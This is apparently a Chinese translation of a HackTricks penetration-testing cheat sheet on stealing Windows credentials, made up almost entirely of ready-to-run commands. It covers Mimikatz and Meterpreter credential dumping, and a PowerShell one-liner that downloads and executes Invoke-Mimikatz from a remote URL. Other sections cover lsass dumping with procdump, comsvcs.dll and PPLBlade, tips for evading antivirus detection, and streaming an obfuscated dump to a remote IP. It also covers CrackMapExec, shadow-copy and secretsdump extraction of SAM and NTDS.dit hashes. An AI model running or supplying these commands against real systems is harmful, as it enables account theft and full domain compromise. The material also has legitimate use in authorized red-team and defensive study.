# 窃取Windows凭证

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库**提交PR来分享你的黑客技巧。**

</details>

## 凭证 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在** [**此页面**](credentials-mimikatz.md) **中找到 Mimikatz 的其他功能。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**了解一些可能的凭证保护措施。**](credentials-protections.md) **这些保护措施可能会阻止Mimikatz提取某些凭证。**

## 使用Meterpreter的凭证

使用我创建的[**凭证插件**](https://github.com/carlospolop/MSF-Credentials)来**搜索受害者内部的密码和哈希值**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过杀毒软件

### Procdump + Mimikatz

由于 [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 的 **Procdump 是微软的合法工具**，因此不会被 Defender 检测到。\
你可以使用这个工具来 **转储 lsass 进程**，**下载转储文件**，并从转储中 **本地提取** **凭据**。

{% code title="转储 lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
{% endcode %}

{% code title="从转储中提取凭证" %}
```
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
```markdown
{% endcode %}

此过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会将使用 **procdump.exe 转储 lsass.exe** 的行为 **检测** 为 **恶意**，这是因为它们在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump，而不是 **名称 lsass.exe**，会更 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

有一个名为 **comsvcs.dll** 的 DLL，位于 `C:\Windows\System32`，它会在进程 **崩溃** 时 **转储进程内存**。这个 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，它被编写为可以通过 `rundll32.exe` 调用。\
前两个参数不被使用，但第三个参数被分为三部分。第一部分是将被转储的进程 ID，第二部分是转储文件位置，第三部分是单词 **full**。没有其他选择。\
一旦这三个参数被解析，基本上这个 DLL 就会创建转储文件，并将指定的进程转储到该文件中。\
得益于这个函数，我们可以使用 **comsvcs.dll** 来转储 lsass 进程，而不是上传 procdump 并执行它。（此信息摘自 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)）
```
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
我们必须记住，这项技术只能以**SYSTEM**身份执行。

**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy) **自动化此过程。**

### **使用任务管理器转储lsass**

1. 右键点击任务栏，然后点击任务管理器
2. 点击更多详情
3. 在进程标签中搜索“本地安全权限进程”
4. 右键点击“本地安全权限进程”，然后点击“创建转储文件”。

### 使用procdump转储lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持混淆内存转储并在不将其写入磁盘的情况下传输到远程工作站。

**主要功能**：

1. 绕过 PPL 保护
2. 混淆内存转储文件以规避 Defender 基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传内存转储，不将其写入磁盘（无文件转储）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### 转储SAM哈希
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储LSA机密
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标DC中转储NTDS.dit文件
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标DC中转储NTDS.dit密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个NTDS.dit账户的pwdLastSet属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 窃取 SAM & SYSTEM 文件

这些文件应该**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_。但是**你不能用常规方式复制它们**，因为它们受到了保护。

### 从注册表

窃取这些文件的最简单方法是从注册表获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的Kali机器并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影复制服务

您可以使用此服务复制受保护的文件。您需要是管理员。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
```markdown
但你也可以通过**Powershell**来做同样的事情。这是一个**如何复制SAM文件**的例子（使用的硬盘是"C:"，并且它被保存到C:\users\Public），但你可以用这个方法复制任何受保护的文件：
```
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最后，您也可以使用 [**PS 脚本 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭据 - NTDS.dit**

**Ntds.dit 文件是一个存储 Active Directory 数据的数据库**，包括有关用户对象、组和组成员资格的信息。它包含域中所有用户的密码哈希。

重要的 NTDS.dit 文件将位于：_%SystemRoom%/NTDS/ntds.dit_\
这个文件是一个 _Extensible Storage Engine_ (ESE) 数据库，它“官方”由 3 个表组成：

* **数据表**：包含对象（用户、组等）的信息
* **链接表**：关于关系的信息（成员属于...）
* **SD 表**：包含每个对象的安全描述符

更多信息请访问：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然后，**部分** **NTDS.dit** 文件可能位于 **`lsass` 内存中**（你可能会发现最近访问的数据，这可能是因为使用 **缓存** 提高了性能）。

#### 解密 NTDS.dit 中的哈希

哈希被加密 3 次：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥（**PEK**）。
2. 使用 **PEK** 和 **RC4** 解密 **哈希**。
3. 使用 **DES** 解密 **哈希**。

**PEK** 在 **每个域控制器**中都有**相同的值**，但它在 **NTDS.dit** 文件中使用域控制器的 **SYSTEM 文件的 BOOTKEY（在不同域控制器之间不同）**进行了**加密**。这就是为什么要从 NTDS.dit 文件中获取凭据，**你需要 NTDS.dit 和 SYSTEM 文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起提供。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你还可以使用[**卷影复制**](./#stealing-sam-and-system)技巧来复制**ntds.dit**文件。记住，你还需要一份**SYSTEM文件**的副本（同样，[**从注册表中导出或使用卷影复制**](./#stealing-sam-and-system)技巧）。

### **从NTDS.dit中提取哈希**

一旦你**获取**了**NTDS.dit**和**SYSTEM**文件，你可以使用像_secretsdump.py_这样的工具来**提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用一个有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**大型 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 来提取。

最后，您还可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain\_hashdump_ 或者 **mimikatz** `lsadump::lsa /inject`

### **从 NTDS.dit 提取域对象到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库。不仅提取了秘密，还提取了整个对象及其属性，以便在已经检索到原始 NTDS.dit 文件时进一步提取信息。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 其他工具用于从SAM和LSASS提取凭据

### Windows 凭据编辑器 (WCE)

此工具可用于从内存中提取凭据。从以下链接下载：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从此处下载：[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)，直接**执行**即可提取密码。

## 防御措施

[**在这里了解一些凭证保护措施。**](credentials-protections.md)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
